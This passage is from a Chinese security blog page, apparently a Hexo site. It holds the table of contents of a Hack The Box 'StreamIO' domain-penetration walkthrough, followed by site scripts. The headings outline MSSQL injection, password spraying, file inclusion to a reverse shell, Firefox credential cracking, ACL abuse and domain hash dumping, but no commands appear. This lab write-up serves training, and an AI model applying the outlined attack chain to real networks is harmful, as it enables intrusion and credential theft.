class="toc-number">1.6.</span> <span class="toc-text">80 端口 web 渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#443-%E7%AB%AF%E5%8F%A3-web-%E6%B8%97%E9%80%8F"><span class="toc-number">1.7.</span> <span class="toc-text">443 端口 web 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E7%9C%8B-streamio-htb"><span class="toc-number">1.7.1.</span> <span class="toc-text">先看 streamio.htb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%8D%E7%9C%8B-watch-streamio-htb"><span class="toc-number">1.7.2.</span> <span class="toc-text">再看 watch.streamio.htb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4%EF%BC%88%E4%BA%A4%E5%8F%89%E9%AA%8C%E8%AF%81%EF%BC%81%EF%BC%89"><span class="toc-number">1.7.3.</span> <span class="toc-text">目录爆破（交叉验证！）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#gobuster"><span class="toc-number">1.7.3.1.</span> <span class="toc-text">gobuster</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#feroxbuster"><span class="toc-number">1.7.3.2.</span> <span class="toc-text">feroxbuster</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL%EF%BC%88%E5%8D%B3-SQL-server%EF%BC%89%E6%B3%A8%E5%85%A5"><span class="toc-number">1.8.</span> <span class="toc-text">MSSQL（即 SQL server）注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.8.1.</span> <span class="toc-text">发现存在漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8C%9C%E5%88%97%E6%95%B0"><span class="toc-number">1.8.2.</span> <span class="toc-text">猜列数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%88%E6%9C%AC"><span class="toc-number">1.8.3.</span> <span class="toc-text">版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.8.4.</span> <span class="toc-text">数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A8%E5%90%8D"><span class="toc-number">1.8.5.</span> <span class="toc-text">表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E5%90%8D"><span class="toc-number">1.8.6.</span> <span class="toc-text">列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%9B%E5%AF%86%E7%A0%81"><span class="toc-number">1.8.7.</span> <span class="toc-text">用户名；密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E7%90%86%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81"><span class="toc-number">1.8.8.</span> <span class="toc-text">整理用户名密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hashcat-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.9.</span> <span class="toc-text">hashcat 暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86"><span class="toc-number">1.9.1.</span> <span class="toc-text">数据处理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crackmapexec-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84-smb-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.10.</span> <span class="toc-text">crackmapexec 密码喷射 smb 系统服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hydra-%E7%BD%91%E9%A1%B5%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84"><span class="toc-number">1.11.</span> <span class="toc-text">hydra 网页登录密码喷射</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E7%B2%BE%E8%AE%B2%EF%BC%9AHTB-StreamIO-%E7%AB%8B%E8%B6%B3%E7%82%B9%E4%B9%8B%E6%88%98-%E5%8F%88%E4%B8%80%E6%B3%A2%E6%8A%80%E8%83%BD%E8%80%83%E9%AA%8C%EF%BC%9A%E5%8F%82%E6%95%B0%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E3%80%81%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%81%E6%8E%B3%E6%8E%A0%E5%A4%87%E4%BB%BD%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%81%E7%BA%B5%E5%90%91%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">靶机精讲：HTB StreamIO 立足点之战 - 又一波技能考验：参数模糊测试、伪协议文件包含、代码审计、掳掠备份数据库、纵向提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2%E6%B8%97%E9%80%8F%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">管理页面渗透分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#master-php"><span class="toc-number">2.1.1.</span> <span class="toc-text">master.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#admin-%E7%9B%AE%E5%BD%95"><span class="toc-number">2.1.2.</span> <span class="toc-text">admin 目录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#user-management"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">user management</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#staff-management"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">staff management</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#movie-management"><span class="toc-number">2.1.2.3.</span> <span class="toc-text">movie management</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#leave-a-message-for-admin"><span class="toc-number">2.1.2.4.</span> <span class="toc-text">leave a message for admin</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wfuzz-%E5%8F%82%E6%95%B0%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95"><span class="toc-number">2.2.</span> <span class="toc-text">wfuzz 参数模糊测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.3.</span> <span class="toc-text">伪协议文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">2.4.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%8F%8D%E5%BC%B9-shell"><span class="toc-number">2.5.</span> <span class="toc-text">构造反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8-web-%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">2.5.1.</span> <span class="toc-text">启动 web 服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B%E7%9B%91%E5%90%AC"><span class="toc-number">2.5.2.</span> <span class="toc-text">建立监听</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#curl-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-shell-php"><span class="toc-number">2.5.3.</span> <span class="toc-text">curl 远程文件包含 shell.php</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E7%B3%BB%E7%BB%9F%E7%AB%8B%E8%B6%B3%E7%82%B9-yoshihide-%E7%94%A8%E6%88%B7-shell"><span class="toc-number">2.6.</span> <span class="toc-text">获得系统立足点 yoshihide 用户 shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%B3%E6%8E%A0%E5%A4%87%E4%BB%BD%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.7.</span> <span class="toc-text">掳掠备份数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E7%90%86%E6%95%B0%E6%8D%AE"><span class="toc-number">2.7.1.</span> <span class="toc-text">整理数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hashcat-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">2.7.2.</span> <span class="toc-text">hashcat 密码破解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%B5%E5%90%91%E6%8F%90%E6%9D%83%E6%88%90%E5%8A%9F%EF%BC%8C%E8%8E%B7%E5%BE%97-userflag"><span class="toc-number">2.8.</span> <span class="toc-text">纵向提权成功，获得 userflag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E7%B2%BE%E8%AE%B2%EF%BC%9AHTB-StreamIO-%E5%9F%9F%E6%8E%A7%E5%86%B3%E6%88%98-Firefox-%E5%87%AD%E6%8D%AE%E7%88%86%E7%A0%B4%E3%80%81Bloodhound-%E8%B7%AF%E5%BE%84%E6%9E%9A%E4%B8%BE%E5%92%8C%E6%89%8B%E5%B7%A5%E5%9F%9F%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84%E6%9E%9A%E4%B8%BE%EF%BC%8C%E7%81%AB%E5%8A%9B%E5%85%A8%E5%BC%80"><span class="toc-number">3.</span> <span class="toc-text">靶机精讲：HTB StreamIO 域控决战 - Firefox 凭据爆破、Bloodhound 路径枚举和手工域攻击路径枚举，火力全开</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.1.</span> <span class="toc-text">系统枚举</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Firefox-%E5%87%AD%E6%8D%AE%E7%A0%B4%E8%A7%A3"><span class="toc-number">3.2.</span> <span class="toc-text">Firefox 凭据破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E5%87%AD%E6%8D%AE-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">3.2.1.</span> <span class="toc-text">发现凭据&#x2F;配置文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3%E6%96%B9%E5%BC%8F"><span class="toc-number">3.2.2.</span> <span class="toc-text">破解方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E5%9B%9E%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="toc-number">3.2.3.</span> <span class="toc-text">传回敏感文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#firepwd-%E7%A0%B4%E8%A7%A3"><span class="toc-number">3.2.4.</span> <span class="toc-text">firepwd 破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E7%90%86%E5%87%AD%E6%8D%AE"><span class="toc-number">3.2.5.</span> <span class="toc-text">整理凭据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-crackmapexec-%E5%AF%86%E7%A0%81%E9%AA%8C%E8%AF%81%EF%BC%8C%E8%8E%B7%E5%BE%97-JDgodd-%E5%87%AD%E6%8D%AE"><span class="toc-number">3.3.</span> <span class="toc-text">使用 crackmapexec 密码验证，获得 JDgodd 凭据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bloodhound-%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90"><span class="toc-number">3.4.</span> <span class="toc-text">bloodhound 攻击路径分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%87%E9%9B%86%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8%E2%80%94%E6%9C%89%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E2%80%93kali"><span class="toc-number">3.4.1.</span> <span class="toc-text">采集器的使用—有用户名密码–kali</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%BB%E7%A8%8B%E5%BA%8F%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">3.4.2.</span> <span class="toc-text">初始化主程序数据库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E5%88%86%E6%9E%90%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84%EF%BC%88%E5%90%8C-bloodhound-%E5%81%9A%E6%B3%95%E4%B8%8E%E7%9B%AE%E7%9A%84%E4%B8%80%E8%87%B4%EF%BC%89"><span class="toc-number">3.5.</span> <span class="toc-text">手工分析活动目录攻击路径（同 bloodhound 做法与目的一致）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%81-DN%EF%BC%88Distinguished-Name%EF%BC%89%E8%A7%A3%E6%9E%90"><span class="toc-number">3.6.</span> <span class="toc-text">📁 DN（Distinguished Name）解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84%E6%80%BB%E7%BB%93"><span class="toc-number">3.7.</span> <span class="toc-text">攻击路径总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B"><span class="toc-number">3.8.</span> <span class="toc-text">域控提权过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerSploit-%E7%AC%AC%E4%B8%89%E6%96%B9%E5%B7%A5%E5%85%B7"><span class="toc-number">3.8.1.</span> <span class="toc-text">PowerSploit 第三方工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9-jdgodd-%E7%94%A8%E6%88%B7%E7%9A%84%E5%87%AD%E6%8D%AE%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86"><span class="toc-number">3.8.2.</span> <span class="toc-text">对 jdgodd 用户的凭据进行处理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%94%9F%E6%88%90%E5%AE%89%E5%85%A8%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AF%86%E7%A0%81"><span class="toc-number">3.8.2.1.</span> <span class="toc-text">1. 生成安全字符串密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9E%84%E9%80%A0%E5%9F%9F%E5%87%AD%E6%8D%AE%E5%AF%B9%E8%B1%A1"><span class="toc-number">3.8.2.2.</span> <span class="toc-text">2. 构造域凭据对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%9F%A5%E7%9C%8B%E5%9F%9F%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%EF%BC%88%E5%89%8D%E5%90%8E%E4%B8%A4%E6%AC%A1%EF%BC%89"><span class="toc-number">3.8.2.3.</span> <span class="toc-text">3. 查看域用户信息（前后两次）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%B8%BA%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E7%9B%AE%E6%A0%87%E5%AF%B9%E8%B1%A1%E7%9A%84-ACL-%E6%9D%83%E9%99%90"><span class="toc-number">3.8.2.4.</span> <span class="toc-text">4. 为用户添加目标对象的 ACL 权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%B0%86%E7%94%A8%E6%88%B7%E5%8A%A0%E5%85%A5%E7%9B%AE%E6%A0%87%E5%9F%9F%E7%BB%84"><span class="toc-number">3.8.2.5.</span> <span class="toc-text">5. 将用户加入目标域组</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E5%9F%9F%E6%8E%A7%E5%AF%86%E7%A0%81"><span class="toc-number">3.8.3.</span> <span class="toc-text">读取域控密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE%E9%83%BD%E5%8F%AF%E4%BB%A5%E8%AF%BB%E5%8F%96-DC-%E5%AF%86%E7%A0%81"><span class="toc-number">3.8.4.</span> <span class="toc-text">基于多种协议都可以读取 DC 密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ldapsearch"><span class="toc-number">3.8.4.1.</span> <span class="toc-text">ldapsearch</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#crackmapexec-1"><span class="toc-number">3.8.4.2.</span> <span class="toc-text">crackmapexec</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%9C%80%E9%AB%98%E6%9D%83%E9%99%90"><span class="toc-number">3.9.</span> <span class="toc-text">获取系统最高权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BD%AC%E5%82%A8%E5%9F%9F%E5%86%85-hash"><span class="toc-number">3.10.</span> <span class="toc-text">转储域内 hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B%E6%80%BB%E7%BB%93"><span class="toc-number">3.11.</span> <span class="toc-text">渗透过程总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7-%E6%8A%80%E6%9C%AF-%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93"><span class="toc-number">3.12.</span> <span class="toc-text">工具&amp;技术&amp;思路总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.12.1.</span> <span class="toc-text">一、信息收集与枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B%E4%B8%8E%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95"><span class="toc-number">3.12.2.</span> <span class="toc-text">二、漏洞探测与模糊测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%87%AD%E6%8D%AE%E8%8E%B7%E5%8F%96%E4%B8%8E%E7%A0%B4%E8%A7%A3"><span class="toc-number">3.12.3.</span> <span class="toc-text">三、凭据获取与破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">3.12.4.</span> <span class="toc-text">四、权限维持与横向移动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%95%B0%E6%8D%AE%E4%B8%8E%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86"><span class="toc-number">3.12.5.</span> <span class="toc-text">五、数据与文本处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E7%B3%BB%E7%BB%9F%E4%B8%8E%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE"><span class="toc-number">3.12.6.</span> <span class="toc-text">六、系统与网络配置</span></a></li></ol></li></ol></li></ol>
+      </div>
+      
+        <div class="catelogue catelogue-2">
+           
+          
+            <p>
+              <span>下一篇</span>
+              <a href="/2026/03/20/委派攻击/">委派攻击</a>
+            </p>
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+<script>
+  // var定义，避免pjax重新进来造成的重复声明错误
+  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧\\x7e","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
+  new Valine({
+    el: '#vcomments',
+    appId: config.appId,
+    appKey: config.appKey,
+    placeholder: config.placeholder,
+    meta: config.meta,
+    recordIP: config.recordIP,
+    visitor: config.visitor,
+    enableQQ: config.enableQQ,
+    path: '2026/03/26/域渗透靶机HTB-StreamIO/'
+  })
+</script>
+
+
+<script>
+  $(document).on('pjax:complete', function() {
+    const tocs = document.querySelector('.toc')
+    const links = tocs ? tocs.querySelectorAll('a') : []
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        const href = decodeURIComponent(e.href)
+        href.search(/#(.*)/)
+        const id = RegExp.$1
+        const target = document.querySelector('#' + id)
+        const top = target.offsetTop
+        document.documentElement.scrollTo({
+          top: top - 100,
+          behavior: 'smooth'
+        })
+        e.preventDefault()
+      })
+    })
+  })
+</script> 
+
+</div>
+      <div class="main-right-wrapper"><div class="main-right">
+  <div class="main-right--board">
+    <div class="main-right--title">
+      <h5>公告栏</h5>
+      <i class="iconfont icon-gonggao"></i>
+    </div>
+    <div class="main-right--content">
+      Hello，欢迎你们来到博客小站，希望能在这里收获到有用的东西哦！ 
+    </div>
+  </div>
+
+  <div id="aplayer" class="main-right--music"></div>
+
+  <div class="operate-items">
+    <div class="operate-item backtop">
+      <i class="iconfont icon-huidaodingbu"></i>
+      <span>回到顶部</span>
+    </div>
+    
+    <div class="operate-item turn-comment hidden">
+      <i class="iconfont icon-pinglun"></i>
+      <span>查看评论</span>
+    </div>
+    
+  </div>
+
+  <div class="main-right--site">
+    <div class="main-right--power">
+      <p>Power By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a>.</p>
+      <p>Theme：<a target="_blank" rel="noopener" href="https://github.com/Aizener/hexo-theme-cola">Cola.</a></p>
+    </div>
+    <p class="main-right--refer"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">...</a> </p>
+  </div>
+</div>
+
+<script>
+  function setOperateItem () {
+    const reg = /\d{4}\/\d{2}\/\d{2}\/.+/
+    const path = location.pathname
+    const operateDom = document.querySelector('.main-right .operate-items')
+    const commentDom = document.querySelector('.turn-comment')
+    const cateloguDom = document.querySelector('.article-catelogue > .article-catelogue--wrapper');
+
+    if (commentDom) {
+      if (reg.test(path) || path.match(/\/log\/.+/)) {
+        commentDom.classList.remove('hidden')
+        const newDom = operateDom.cloneNode(true);
+        const _backtopDom = newDom.querySelector('.backtop');
+        const _commentDom = newDom.querySelector('.turn-comment');
+        _backtopDom.addEventListener('click', () => backTopEvent());
+        _commentDom.addEventListener('click', () => commentDomEvent());
+        cateloguDom.appendChild(newDom);
+      } else {
+        commentDom.classList.add('hidden')
+      }
+    }
+  }
+
+  setOperateItem()
+  const musics = JSON.parse(`[{"name":"安河桥","artist":"宋冬野","url":"http://ting6.yymp3.net:82/new25/songdongye/11.mp3","cover":"https://img2.baidu.com/it/u=1260056724,1076343118&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"},{"name":"卡布达","artist":"暂无","url":"music/kabuda.mp3","cover":"https://img2.baidu.com/it/u=705831265,2862720033&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"}]`)
+  const ap = new APlayer({
+    container: document.querySelector('#aplayer'),
+    audio: musics,
+  })
+
+  $(document).on('pjax:complete', function() {
+    setOperateItem()
+  })
+
+  document.querySelector('.backtop').addEventListener('click', () => {
+    backTopEvent();
+  })
+  const dom = document.querySelector('.turn-comment')
+  dom && dom.addEventListener('click', () => {
+    commentDomEvent();
+  })
+
+  function backTopEvent() {
+    document.documentElement.scrollTo({
+      top: 0,
+      behavior: 'smooth'
+    })
+  }
+
+  function commentDomEvent() {
+    const commentDom = document.querySelector('.comments-intro')
+    if (!commentDom) return
+    const top = commentDom.offsetTop, height = commentDom.offsetHeight
+    document.documentElement.scrollTo({
+      top: top - 2 * height,
+      behavior: 'smooth'
+    })
+  }
+</script></div>
+    </section>
+  </div>
+  <div id="progress" class="progress"></div>
+  <div id="gray" class="gray"></div>
+
+  <script>
+    function initScroll () {
+      document.addEventListener('scroll', () => {
+        const doc = document.documentElement
+        const scrollTop = doc.scrollTop
+        const pageHeight = doc.offsetHeight
+        const clientHeight = doc.clientHeight
+        const ratio = scrollTop / (pageHeight - clientHeight)
+        const progress = document.querySelector('#progress')
+        const avatarImg = document.querySelector('.main-left--avatar')
+        progress.style.width = (100 * ratio) + '%'
+        avatarImg.style.transform = `rotate(${360 * ratio}deg)`
+      })
+    }
+
+    const rootPath = "/"
+
+    const checkAndSetArticlePageLayout = () => {
+      const path = location.pathname.replace(rootPath, '');
+      if (
+        /^\/?\d{4}\/\d{2}\/\d{2}\/.*/.test(path) ||
+        /^log\/.+/.test(path)
+      ) {
+        $('.main-container, .main-right, .main-right-wrapper').addClass('is-article')
+      } else {
+        $('.main-container, .main-right, .main-right-wrapper').removeClass('is-article')
+      }
+    }
+
+    const gray = "none"
+    const setGrayStyle = () => {
+      if (gray === 'none') {
+        return
+      } else if (gray === 'index') {
+        location.pathname === '/' ? $('#gray').show() : $('#gray').hide()
+      } else if (gray === 'all') {
+        $('#gray').show()
+      }
+    }
+    setGrayStyle()
+
+
+    window.onload = function () {
+      checkAndSetArticlePageLayout()
+      setTimeout(() => {
+        $('#load').slideUp()
+        $('#container').slideToggle()
+        setTimeout(() => {
+          initScroll();
+        }, 500)
+      }, 500)
+    }
+    
+    let status = 0
+    // 对所有链接跳转事件绑定pjax容器container
+    $(document).pjax('a[target!=_blank]', '#main-container', {
+      container: '#main-container',
+      fragment: '#main-container',
+      timeout: 8000
+    })
+
+    $(document).on('pjax:start', function() {
+    })
+    $(document).on('pjax:complete', function() {
+      status = 0
+      $('.main-container').addClass('to-up').on('animationend', function() {
+        $(this).removeClass('to-up')
+      })
+      setGrayStyle()
+      checkAndSetArticlePageLayout()
+    })
+    $(document).on('pjax:popstate', function() {
+      status = -1
+      checkAndSetArticlePageLayout()
+    });
+  </script>
+</body>
+</html>
